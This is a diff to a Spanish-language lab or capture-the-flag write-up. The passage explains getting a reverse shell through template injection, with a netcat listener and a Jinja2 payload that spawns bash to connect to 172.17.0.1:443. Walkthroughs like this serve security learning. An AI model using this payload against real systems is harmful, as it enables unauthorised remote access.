@@ -71,13 +71,16 @@ Al introducir lo anterior comprobamos que nos responde con lo siguiente:
 <br>
 
 Por lo que ahora nos mandaríamos una revshell. Este parte se puede hacer de muchas formas. <br>
-Una de ellas sería ponernos en escucha con netcat, escribiendo en nuestra terminal `nc -nlvp 443`, y despues e el payload en vez de poner el comando `id`, nos mandaremos una revshell poniendo lo siguiente: <br>
+Una de ellas sería ponernos en escucha con netcat, escribiendo en nuestra terminal `nc -nlvp 443`, y despues en el payload en vez de poner el comando `id`, nos mandaremos una revshell poniendo lo siguiente: <br>
 
 `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read() }}` 
 
 <br>
+Es importante escapar las comillas simples ya que si no nos dará error.
 
-Es importante escapar las comillas simples ya que si no nos dará error. Una vez mandada la revshell podemos ver que todo ha ido bien: 
+<br>
+
+Una vez mandada la revshell podemos ver que todo ha ido bien: 
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/4e8a35d2-6b8c-496f-a88b-d53638c9a03e)
